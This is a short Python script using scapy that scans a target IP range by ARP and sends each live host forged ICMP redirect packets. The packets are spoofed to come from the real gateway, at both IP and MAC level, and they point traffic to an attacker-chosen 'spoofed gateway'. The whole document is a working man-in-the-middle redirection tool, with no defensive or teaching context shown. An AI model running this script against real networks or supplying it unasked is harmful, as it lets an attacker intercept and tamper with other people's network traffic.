#!/usr/bin/env python3

import argparse, scapy.all as scapy

parser = argparse.ArgumentParser(description="A script to send ICMP redirect packets")
parser.add_argument("-i", "--interface", type=str, required=True, help="The network interface to use")
parser.add_argument("-t", "--target", type=str, required=True, help="The target IP address or range")
parser.add_argument("-g", "--gateway", type=str, required=True, help="The gateway IP address")
parser.add_argument("-s", "--spoofed-gateway", type=str, required=True, help="The spoofed gateway IP address")
args = parser.parse_args()

gateway_mac = scapy.getmacbyip(args.gateway)

hosts = scapy.arping(args.target, iface=args.interface, verbose=False)[0]

for host in hosts:
    host_ip = host[1].psrc
    host_mac = host[1].hwsrc

    packet = scapy.IP(src=args.gateway, dst=host_ip) / scapy.ICMP(type=5, code=1, gw=args.spoofed_gateway) / scapy.IP(src=host_ip, dst="0.0.0.0")

    scapy.sendp(scapy.Ether(src=gateway_mac, dst=host_mac) / packet, iface=args.interface, verbose=False)
